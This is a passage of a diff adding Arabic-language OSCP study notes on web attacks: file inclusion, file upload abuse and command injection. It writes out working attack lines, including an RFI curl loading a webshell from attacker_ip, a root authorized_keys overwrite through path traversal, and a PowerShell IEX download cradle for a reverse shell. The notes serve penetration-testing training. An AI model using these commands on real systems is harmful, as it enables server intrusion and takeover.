+<p><strong>متطلب إعداد مهم:</strong> الـ wrapper <code>data://</code> مش دايمًا قابل للاستغلال افتراضيًا. الاستخدام الناجح عادةً بيتطلب إعداد PHP محدد مفعَّل: <code>allow_url_include = On</code>. لو الإعداد ده معطَّل، الـ wrapper مايقدرش يُستخدم لهجمات الدمج.</p>
+</blockquote>
+<h3>ملخّص PHP Wrappers</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Wrapper</th>
+<th>الاستخدام</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>php://filter</strong></td>
+<td>كشف كود المصدر — بيساعد في تحليل الأجزاء الداخلية للتطبيق، غالبًا بيؤدي لاكتشاف اعتمادات</td>
+</tr>
+<tr>
+<td><strong>data://</strong></td>
+<td>تنفيذ كود عشوائي — بيسمح بحقن payload من غير كتابة ملفات، يقدر يتخطى بعض القيود الأمنية</td>
+</tr>
+</tbody>
+</table></div>
+<h3>Remote File Inclusion (RFI)</h3>
+<p>ثغرات RFI بتحصل بتكرار أقل من LFI لأنها بتتطلب إعدادات سيرفر محددة. في تطبيقات مبنية على PHP، استغلال RFI عادةً بيعتمد على تفعيل إعداد <code>allow_url_include</code>، المعطَّل افتراضيًا في إصدارات PHP الحديثة — نفس المتطلب المطلوب لاستخدام <code>data://</code>.</p>
+<p>بينما LFI بتسمح للمهاجمين يدمجوا ملفات مخزَّنة على السيرفر المحلي، RFI بتمكّن دمج ملفات مستضافة على أنظمة خارجية عبر بروتوكولات زي HTTP أو SMB. بمجرد الدمج، الملف البعيد بينفّذ جوه سياق تطبيق الويب العرضة للخطر.</p>
+<h3>استخدام Webshells لاستغلال RFI</h3>
+<p>توزيعات اختبار أمني زي Kali Linux بتوفّر webshells PHP جاهزة موجودة في:</p>
+<div class="code-wrap"><pre><code>/usr/share/webshells/php/
+</code></pre></div>
+<p><strong>Webshell</strong> سكربت خفيف بيوفّر واجهة أوامر عبر المتصفح، سامحة للمهاجمين بتنفيذ أوامر نظام عن بُعد.</p>
+<h3>جعل الملف البعيد قابل للوصول</h3>
+<p>لاستغلال عيب RFI، المهاجم لازم يستضيف الملف الخبيث على سيرفر الهدف يقدر يوصله. طريقة بسيطة هي إطلاق سيرفر ويب مؤقت باستخدام وحدة HTTP المدمجة في Python من الدليل اللي فيه الـ webshell:</p>
+<div class="code-wrap"><pre><code class="language-bash">python3 -m http.server 8000
+</code></pre></div>
+<p>ده بيخلّي الملف متاح عبر HTTP عشان التطبيق العرضة للخطر يقدر يسترجعه ويدمجه.</p>
+<h3>تحفيز الثغرة</h3>
+<p>بعد استضافة الملف، المهاجم بيتلاعب في الباراميتر العرضة للخطر في تطبيق الويب عشان يشير لـ URL الملف البعيد بدل اسم ملف محلي:</p>
+<div class="code-wrap"><pre><code class="language-bash">curl &quot;http://target.com/index.php?page=http://attacker_ip:8000/webshell.php&amp;cmd=id&quot;
+</code></pre></div>
+<p>لو نجح، التطبيق بينزّل الملف وينفّذه كجزء من معالجته العادية. بتوفير باراميتر إضافي يحتوي أمر نظام، المهاجم يقدر ينفّذ أوامر على السيرفر الهدف ويشوف الخرج من خلال رد تطبيق الويب.</p>
+<h3>تحقيق وصول إضافي</h3>
+<p>الاستغلال الناجح بيأكّد إن تنفيذ كود عشوائي عن بُعد ممكن. في المرحلة دي، المهاجمين غالبًا بيصعّدوا وصولهم بإنشاء reverse shell، اللي بيوفّر جلسة أوامر تفاعلية على النظام المخترَق.</p>
+<p><strong>نقاط أساسية عن RFI:</strong></p>
+<ol>
+<li>بتتطلب إعدادات سيرفر محددة وبالتالي أقل شيوعًا من LFI</li>
+<li>بتسمح بتنفيذ كود مستضاف على أنظمة خارجية</li>
+<li>التطبيقات المعدَّة بشكل خاطئ اللي بتحمّل موارد بعيدة هي الأكتر عرضة للخطر</li>
+<li>الاستغلال ممكن يؤدي مباشرة لاختراق النظام بالكامل</li>
+</ol>
+<hr />
+<h2 id="lu3"><span class="num">03</span><span class="htext">ثغرات File Upload</span></h2>
+<p>كتير من تطبيقات الويب بتسمح للمستخدمين يقدّموا ملفات للسيرفر. ثغرات رفع الملفات عمومًا ممكن تتصنّف لـ 3 مجموعات أساسية:</p>
+<p><strong>1. رفع ملفات تنفيذية</strong> — التطبيق بيسمح برفع ملفات السيرفر يقدر ينفّذها. مثلًا، لو مهاجم قدر يرفع سكربت server-side (زي ملف PHP) لسيرفر ويب مُعدّ يعالج اللغة دي، السكربت يقدر يتحفّز عبر طلب ويب.</p>
+<p><strong>2. دمج الرفع مع ثغرات تانية</strong> — مثلًا، لو نظام عرضة لـ Directory Traversal، مهاجم ممكن يتلاعب في مسار الرفع عشان يكتب فوق ملفات حساسة زي مفاتيح توثيق. ميزات الرفع كمان ممكن تُدمج مع هجمات تانية زي XXE أو XSS — لو منصة بتسمح برفع صور SVG، ملف خبيث ممكن يحتوي payloads مُضمَّنة.</p>
+<p><strong>3. هجمات محتاجة تفاعل المستخدم</strong> — مثلًا، مهاجم ممكن يرفع مستند فيه ماكروز خبيثة متنكّرة كملف شرعي (زي سيرة ذاتية). الهجوم بينجح بس لو حد نزّل وفتح الملف.</p>
+<h3>استخدام ملفات تنفيذية</h3>
+<p><strong>تحديد ميزات الرفع:</strong> حسب طبيعة التطبيق، إمكانيات الرفع ممكن تظهر في أماكن متوقّعة:</p>
+<ol>
+<li>في CMS، المستخدمين عادةً بيرفعوا صور بروفايل، مرفقات، أو وسائط للمنشورات والصفحات</li>
+<li>على مواقع الشركات، نماذج رفع ممكن توجد في أقسام التوظيف لتقديم السير الذاتية أو المستندات</li>
+<li>منصات خاصة بصناعات محددة ممكن تشمل ميزات تقديم ملفات مصمَّمة لـ workflow بتاعتها</li>
+</ol>
+<h3>مثال تطبيقي: استغلال آلية رفع (Windows/XAMPP)</h3>
+<p>في السيناريو ده، ميزة الرفع بتتساء استخدامها لتحقيق تنفيذ أوامر عن بُعد والحصول في النهاية على reverse shell. لوحة الإدارة اتستبدلت بنموذج تقديم ملف بيدعو المستخدمين يرفعوا صور، والمؤشرات بتوحي إن التطبيق شغّال على بيئة Windows باستخدام XAMPP stack.</p>
+<p>لاختبار القيود، ملف نصي بسيط اترفع بنجاح، مؤكّدًا إن النظام مش بيفرض بصرامة رفع صور بس.</p>
+<h3>تجاوز قيود نوع الملف</h3>
+<p>محاولة رفع سكربت server-side بتتمنع لأن التطبيق بيفلتر ملفات بامتدادات محددة. بما إن منطق الفلترة الدقيق مش معروف، محاولات التجاوز بتعتمد على التجربة.</p>
+<p><strong>استراتيجيات تهرّب شائعة:</strong></p>
+<ul>
+<li>استخدام امتدادات بديلة أو أقل شيوعًا مرتبطة بنفس لغة البرمجة (مثلًا <code>.phtml</code>، <code>.php5</code>، <code>.pHp</code>)</li>
+<li>تعديل حالة الأحرف في الامتداد (دمج أحرف كبيرة وصغيرة) لتخطي فلاتر case-sensitive</li>
+</ul>
+<p>تعديل بسيط لامتداد الملف بيسمح للرفع ينجح، موضّحًا إن آليات blacklist البسيطة غالبًا ممكن تُتخطى.</p>
+<h3>تحقيق تنفيذ الأوامر</h3>
+<p>بعد ما الملف الخبيث اتخزّن في دليل الرفع بتاع السيرفر، يقدر يُوصل له مباشرة عبر طلب ويب. بتمرير أوامر كباراميترات، السكربت المرفوع بينفّذها على السيرفر، مؤكّدًا تنفيذ الكود بنجاح:</p>
+<div class="code-wrap"><pre><code class="language-bash">curl &quot;http://target.com/uploads/shell.php?cmd=whoami&quot;
+</code></pre></div>
+<h3>تأسيس Reverse Shell</h3>
+<div class="code-wrap"><pre><code>1. ابدأ listener على جهاز المهاجم
+2. ابعت أمر للسكربت المرفوع يوجّه السيرفر يتصل رجوع
+3. بمجرد تأسيس الاتصال، المهاجم بيستقبل command shell على النظام الهدف
+</code></pre></div>
+<blockquote>
+<p>تقنيات ترميز (زي Base64) غالبًا بتُستخدم لنقل سلاسل أوامر معقَّدة فيها حروف خاصة بأمان.</p>
+</blockquote>
+<h3>استخدام ملفات غير تنفيذية</h3>
+<p>ليه رفع ملفات غير آمن لسه خطير حتى لو الملفات المرفوعة مش قادرة تتنفّذ على السيرفر؟ مثال واقعي شائع هو <strong>Google Drive</strong>، اللي بيقبل تقريبًا أي نوع ملف لكن بيعزلهم بطريقة بتمنع التنفيذ على النظام المضيف. لما الاستغلال المباشر مش ممكن، المهاجمين ممكن يدمجوا ضعف الرفع مع ثغرة تانية — زي Directory Traversal — لتحقيق تأثير ذو معنى.</p>
+<h3>سيناريو: Mountain Desserts (النسخة المُحدَّثة)</h3>
+<p>بعد فتح النسخة الأحدث من تطبيق "Mountain Desserts"، نلاحظ: رفع الملفات لسه مسموح | المنصة دلوقتي شغّالة على Linux ظاهريًا | لينكات إدارية وصفحات PHP معينة مش قابلة للوصول بقى</p>
+<p>محاولات طلب نقاط نهاية PHP معروفة سابقًا يدويًا بترجّع ردود "not found"، موحية إن الـ stack بتاع التطبيق اتغيّر وممكن يكون مابقاش معتمد على PHP. رفع ملف نصي بسيط بينجح، مؤكّدًا إن ميزة الرفع لسه نشطة.</p>
+<h3>فحص سلوك الرفع</h3>
+<p>خطوة اختبار حرجة هي رفع نفس الملف أكتر من مرة:</p>
+<ul>
+<li>لو التطبيق بلّغ إن الملف موجود أصلًا، السلوك ده أحيانًا ممكن يُستغل لعدّ ملفات السيرفر</li>
+<li>لو رسالة خطأ ظهرت، ممكن تكشف تقنيات أو إعدادات أساسية</li>
+</ul>
+<p>أدوات اعتراض الترافيك زي Burp Suite تقدر تُستخدم لفحص وتعديل طلب الرفع لتحليل أعمق.</p>
+<h3>محاولة التلاعب في المسار</h3>
+<p>بعد كده، باراميتر اسم الملف بيتعدّل عشان يشمل تسلسلات مسار نسبية (مثلًا الخروج برّه الدليل المقصود). ده بيختبر هل السيرفر بيتعامل بشكل خاطئ مع مسارات الملفات ويسمح بكتابة ملفات أبعد من web root.</p>
+<blockquote>
+<p><strong>تحذير مهم:</strong> في اختبارات اختراق حقيقية، الكتابة فوق ملفات بشكل أعمى ممكن تعطّل أنظمة إنتاجية، تسبب فقدان بيانات، أو تحفّز انقطاعات — عشان كده حذر شديد مطلوب.</p>
+</blockquote>
+<h3>فهم صلاحيات السيرفر</h3>
+<p>تطبيقات الويب عادةً بتشتغل تحت حسابات خدمة مقيَّدة: على Linux، سيرفرات الويب غالبًا بتشتغل كمستخدم منخفض الصلاحية (حساب خدمة مخصَّص) | على Windows، خدمات زي Microsoft IIS ممكن تشتغل تحت هويات محدودة زي Network Service أو حسابات application pool</p>
+<p>لكن نشرات معدَّة بشكل سيء أحيانًا بتشغّل تطبيقات بصلاحيات مرتفعة (root أو Administrator)، وده بيزوّد الخطر بشكل كبير.</p>
+<h3>التصعيد عبر الكتابة فوق الملفات</h3>
+<p>لو path traversal جوه آلية الرفع نجح، المهاجمين ممكن يجرّبوا يكتبوا فوق ملفات حساسة. هدف عالي التأثير على أنظمة Linux هو ملف <strong>SSH authorized_keys</strong> لحساب ذو صلاحية. باستبدال الملف ده بمفتاح عام يتحكم فيه المهاجم، يقدروا محتمل يحصلوا على وصول بعيد عبر SSH.</p>
+<p><strong>العملية بتشمل:</strong></p>
+<div class="code-wrap"><pre><code>1. توليد زوج مفاتيح SSH
+   ssh-keygen -t rsa -f attacker_key
+
+2. تجهيز ملف يحتوي المفتاح العام
+
+3. رفعه باستخدام مسار متلاعَب فيه يستهدف دليل إعداد المستخدم ذو الصلاحية
+   filename=../../../../root/.ssh/authorized_keys
+</code></pre></div>
+<p>لو نجح، المهاجم يقدر يوثّق باستخدام المفتاح الخاص المقابل:</p>
+<div class="code-wrap"><pre><code class="language-bash">ssh -i attacker_key root@target_ip
+</code></pre></div>
+<blockquote>
+<p><strong>بعد الكتابة فوق ملف المفتاح، محاولة اتصال SSH ممكن تمنح وصول إداري مباشر للسيرفر</strong> — موضّحة إزاي عيب رفع بسيط ممكن يتصعّد لاختراق نظام كامل حتى من غير رفعات تنفيذية.</p>
+</blockquote>
+<hr />
+<h2 id="lu4"><span class="num">04</span><span class="htext">OS Command Injection</span></h2>
+<p>تطبيقات الويب غالبًا محتاجة تتواصل مع نظام التشغيل عشان تنفّذ مهام زي إدارة الملفات المُنشأة أثناء الرفع أو تنفيذ عمليات صيانة. من الأفضل إن المطورين يعتمدوا على واجهات آمنة أو نداءات نظام مُعرَّفة مسبقًا بتتحكم بصرامة في إزاي الأوامر بتتنفّذ.</p>
+<p>لكن بناء واجهات أوامر آمنة محتاج وقت وتخطيط كبير. لما التطبيقات لازم تتعامل مع سيناريوهات كتيرة ومختلفة، المطورين أحيانًا بيختاروا نهج أسرع: تمرير مدخل المستخدم مباشرة لأوامر النظام بعد تطبيق فلترة أساسية. الممارسة دي بتقدّم خطر لأن الفلترة غالبًا ناقصة وممكن تتخطى.</p>
+<h3>تحليل التطبيق العرضة للخطر</h3>
+<p>اعتبر تطبيق ويب محدَّث اسمه <strong>"Mountain Vaults"</strong>. الواجهة دلوقتي فيها ميزة بتسمح للمستخدمين يستنسخوا مستودعات Git بتقديم أمر شبيه باللي عادةً بيتكتب في terminal.</p>
+<p>بما إن التطبيق ظاهريًا بينفّذ السلسلة المقدَّمة على السيرفر، الوظيفة دي بتثير شك إن المدخل ممكن يتمرّر مباشرة لنظام التشغيل. لو كده، ممكن يسمح للمهاجمين يضيفوا أوامر إضافية.</p>
+<p>كاختبار، تقديم طلب استنساخ مستودع شرعي — زي استنساخ مستودع Exploit Database — بينتج محاولة السيرفر ينفّذ العملية ويعرض خرج الأمر. حقيقة إن الأمر المنفَّذ بيترجّع صدى (echoed back) بتأكّد إن تنفيذ على مستوى النظام بيحصل وراء الكواليس.</p>
+<h3>تحديد نقطة الحقن</h3>
+<p>فحص طلب HTTP باستخدام Burp Suite بيكشف إن مدخل المستخدم بيتبعت عبر باراميتر اسمه <strong>"Archive"</strong>. ده بيوضّح إن تعديل الباراميتر ده ممكن يسمح بتنفيذ أوامر عشوائية.</p>
+<p>لما نستبدل المدخل المتوقَّع بأمر نظام، التطبيق بيكتشف نشاط مشبوه ويمنعه — ده بيوحي بوجود فلتر مصمَّم لمنع command injection.</p>
+<h3>فهم القيود</h3>
+<p>لفهم القيود، الاختبار بيبدأ بمدخل صالح أدنى. تقديم بس الأمر الأساسي (<code>git</code>) بينجح ويعرض معلومات المساعدة، مؤكّدًا إن التنفيذ مسموح طالما المدخل بيبان شرعي:</p>
+<div class="code-wrap"><pre><code class="language-bash">Archive=git
+# → ينجح، بيعرض git help
+
+Archive=git --version
+# → ينجح، بيكشف تفاصيل بيئية زي هل السيرفر Windows ولا Linux
+</code></pre></div>
+<h3>تجاوز فلاتر المدخل</h3>
+<p>بما إن التنفيذ المباشر للأوامر مقيَّد، الخطوة الجاية هي تجربة <strong>command chaining</strong>. كتير من مفسّرات الأوامر بتسمح بتنفيذ أوامر متعددة بالتتابع باستخدام فواصل زي الفواصل المنقوطة أو علامات <code>&amp;</code>.</p>
+<div class="code-wrap"><pre><code class="language-bash"># مثال: إدراج فاصل أمر مرمَّز متبوع بأمر تاني
+Archive=git%26whoami
+</code></pre></div>
+<p>بإدراج فاصل أمر مرمَّز متبوع بأمر تاني، الاتنين بينفّذوا بنجاح. ده بيوضّح إن الفلتر بيفحص بس إذا كان المدخل يحتوي الكلمة المفتاحية المتوقَّعة ومش بينقّي بشكل سليم باقي السلسلة.</p>
+<h3>تحديد بيئة التنفيذ</h3>
+<p>فهم أنهي shell بيعالج الأوامر المحقونة مهم لصياغة payloads موثوقة. أمر اختبار مصمَّم خصيصًا يقدر يكشف هل التنفيذ بيحصل في Command Prompt أو PowerShell على أنظمة Windows:</p>
+<div class="code-wrap"><pre><code class="language-bash">Archive=git%26$PSVersionTable
+</code></pre></div>
+<p>الخرج بيوضّح إن الأوامر بتشتغل جوه بيئة <strong>PowerShell</strong>، وده بيأثر على التقنيات اللي ممكن تُستخدم لاستغلال إضافي.</p>
+<h3>تحقيق وصول عن بُعد</h3>
+<p>بتأكيد command injection ومعرفة بيئة الـ shell، المهاجمين يقدروا يجربوا يحصلوا على وصول تفاعلي للنظام:</p>
+<div class="code-wrap"><pre><code>1. استضافة سكربت على سيرفر يتحكم فيه المهاجم
+2. إجبار النظام الهدف ينزّل وينفّذ السكربت ده عبر الأمر المحقون
+3. تأسيس اتصال رجوع للمهاجم
+</code></pre></div>
+<p>أدوات زي <strong>Netcat</strong> تقدر تستمع لاتصالات واردة، بينما سيرفر ويب بسيط يقدر يستضيف الـ payload:</p>
+<div class="code-wrap"><pre><code class="language-bash"># على جهاز المهاجم
+nc -lvnp 4444
+
+# الأمر المحقون في التطبيق (مثال PowerShell)
+Archive=git%26powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip/shell.ps1')&quot;
+</code></pre></div>
+<h3>نقاط أساسية — Command Injection</h3>
+<ol>
+<li><strong>Command injection</strong> بتنشأ لما التطبيقات بتنفّذ مدخل المستخدم كأوامر نظام</li>
+<li>فلترة <strong>blacklist</strong> لوحدها غير موثوقة وغالبًا قابلة للتجاوز</li>
+<li>كشف خرج الأمر ممكن يعرّض معلومات نظام قيّمة</li>
+<li>الاستغلال الناجح ممكن يؤدي لتحكم كامل عن بُعد في السيرفر</li>
+</ol>
+<hr />
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>في الموديول ده، فحصنا عدة تقنيات هجوم واسعة الانتشار تستهدف تطبيقات الويب. بدأنا بـ directory traversal، موضّحين إزاي المهاجمين يقدروا يوصلوا لملفات برّه web root. بعد كده، انتقلنا لعيوب file inclusion، اللي ممكن تُستغل مش بس لقراءة محتوى الملف لكن كمان لتنفيذ كود بتحميل ملفات في بيئة تشغيل التطبيق. حلّلنا كمان آليات رفع ملفات غير آمنة، غطّينا كل من الـ payloads التنفيذية وغير التنفيذية. أخيرًا، استكشفنا هجمات command injection وإزاي ممكن تُستخدم للتفاعل مع نظام تشغيل سيرفر ويب.</p>
+<p>إتقان طرق الهجوم دي قيّم جدًا لإجراء التقييمات الأمنية. لما تُستغل على تطبيقات مواجهة للإنترنت، نقاط الضعف دي ممكن توفّر نقطة دخول لبيئة الهدف. في الأنظمة الداخلية، ممكن تمكّن الحركة عبر الشبكة للوصول لأصول إضافية.</p>
+<blockquote>
+<p>رغم إن الثغرات دي عمومًا مستقلة عن لغات برمجة أو frameworks محددة، تقنيات الاستغلال غالبًا بتعتمد على التقنيات المستخدَمة. عشان كده، مهم نحدد بسرعة الـ tech stack بتاع التطبيق قبل محاولة أي هجوم.</p>
+</blockquote>
+<hr />
+<p><em>نهاية نوتس الموديول السابع — OSCP: Common Web Application Attacks</em></p>
+  <div class="footer-note">-- EOF: module-07/common-web-application-attacks.md --</div>
+
+</div>
+</body>
+</html>
